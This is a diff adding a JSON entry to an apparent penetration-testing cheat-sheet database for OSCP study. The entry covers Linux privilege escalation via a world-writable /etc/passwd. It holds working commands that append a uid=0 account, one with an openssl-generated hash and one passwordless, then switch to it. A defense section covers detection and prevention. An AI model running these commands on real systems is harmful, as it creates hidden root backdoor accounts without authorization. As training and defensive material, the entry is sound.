@@ -1,0 +1,100 @@
+{
+  "id": "passwd-write-lpe",
+  "name": "Linux PrivEsc - /etc/passwd World-Writable",
+  "command": "openssl passwd <password>",
+  "platform": "linux",
+  "type": "command",
+  "category": "Privilege Escalation",
+  "subcategory": "Linux - Miscellaneous",
+  "description": "When /etc/passwd is world-writable (rare misconfiguration, also exploitable via capability or SUID vim), generate a password hash with openssl passwd and append a root-equivalent entry. The new user gets uid=0 without modifying the existing root account.",
+  "notes": "Requires /etc/passwd to be world-writable (check: ls -la /etc/passwd or unix-privesc-check). Modern systems store passwords in /etc/shadow, but if /etc/passwd has a hash in the second field it overrides shadow lookup \u2014 old behaviour still honoured by Linux PAM. uid=0 gid=0 = root privileges regardless of username. Also covered in: OSCP PEN-200 Chapter 17 (Linux Privilege Escalation).",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "openssl"
+  ],
+  "tags": [
+    "passwd",
+    "lpe",
+    "world-writable"
+  ],
+  "examples": [
+    {
+      "label": "Check if /etc/passwd is world-writable",
+      "command": "ls -la /etc/passwd\n# Exploitable: -rw-rw-rw- 1 root root  (world-write set)\n# Also check: stat /etc/passwd | grep Access"
+    },
+    {
+      "label": "Generate a password hash and append a root-equivalent user",
+      "command": "openssl passwd w00t\n# Example output: Fdzt.eqJQ4s0g\necho \"root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash\" >> /etc/passwd"
+    },
+    {
+      "label": "Switch to the new root-equivalent user",
+      "command": "su root2\n# Password: w00t\nid\n# uid=0(root) gid=0(root) groups=0(root)"
+    }
+  ],
+  "variations": [
+    {
+      "label": "Passwordless root entry (empty second field bypasses password check)",
+      "command": "echo \"root3::0:0:root:/root:/bin/bash\" >> /etc/passwd\nsu root3\n# No password required \u2014 instant root"
+    }
+  ],
+  "tools_used": [
+    "openssl",
+    "su"
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1548",
+    "T1136.001"
+  ],
+  "exam": "exam-ok",
+  "certifications": [
+    "OSCP"
+  ],
+  "primary_cert": "OSCP",
+  "source": "OSCP PEN-200 Chapter 17: Linux Privilege Escalation",
+  "references": [
+    {
+      "title": "GTFOBins - openssl",
+      "url": "https://gtfobins.github.io/gtfobins/openssl/"
+    },
+    {
+      "title": "Linux passwd file format",
+      "url": "https://man7.org/linux/man-pages/man5/passwd.5.html"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP Course)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "capabilities",
+      "rel": "alternative",
+      "note": "cap_dac_override on vim can edit /etc/passwd even without world-write"
+    },
+    {
+      "id": "gs-privesc-enum",
+      "rel": "prereq",
+      "note": "unix-privesc-check will flag world-writable /etc/passwd"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Linux PAM checks the second field of /etc/passwd for a password hash before falling back to /etc/shadow. If the field is non-empty, it is used directly. Since /etc/passwd contains uid/gid fields, appending an entry with uid=0 gid=0 grants root-level access to any account whose credentials match the hash.",
+    "prerequisites": "/etc/passwd writable by the current user (world-writable or owned by current user). openssl available to generate a DES crypt hash.",
+    "impact": "Full root access via a new uid=0 account. Persistent backdoor account survives password resets of existing accounts.",
+    "detection": "File integrity monitoring on /etc/passwd (AIDE, Tripwire, auditd -w /etc/passwd -p wa). New UID=0 account appearing outside of normal provisioning process. Auditd: write to /etc/passwd by non-root user.",
+    "artifacts": "Auditd write event on /etc/passwd by non-root | FIM alert (unexpected /etc/passwd modification) | New uid=0 entry visible in passwd audit",
+    "prevention": "Ensure /etc/passwd permissions are 644 (root-owned, world-readable only). Monitor permissions with auditd or a FIM tool. Do not grant capabilities or SUID bits to editors that can reach /etc/passwd.",
+    "misconfiguration": "/etc/passwd permissions set to 666 (world-writable) \u2014 sometimes caused by scripts or misconfigurations during deployment.",
+    "vulnerable_config": "ls -la /etc/passwd\n# -rw-rw-rw- 1 root root 2178 Jan 10 12:34 /etc/passwd  <- VULNERABLE",
+    "secure_config": "# Fix permissions\nchmod 644 /etc/passwd\nchown root:root /etc/passwd\n\n# Audit with auditd\nauditctl -w /etc/passwd -p wa -k passwd_changes\n\n# FIM baseline\naide --init && cp /var/lib/aide/aide.db.new /var/lib/aide/aide.db",
+    "sources": [
+      "OSCP PEN-200 Ch17",
+      "MITRE T1548",
+      "MITRE T1136.001"
+    ]
+  }
+}
